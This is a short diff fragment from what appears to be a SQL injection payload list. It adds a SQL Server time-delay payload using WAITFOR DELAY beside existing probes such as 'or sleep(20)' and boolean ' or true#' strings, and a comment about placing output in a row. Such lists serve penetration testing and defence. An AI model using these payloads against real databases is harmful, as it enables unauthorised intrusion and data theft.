@@ -7,6 +7,7 @@ or sleep(20) #
 1 ' or true# 
 1 ' or false#
 '%20'
+';WAITFOR DELAY ‘00:00:05’;--
 
 
 # Check for a row where it's possible to place your output
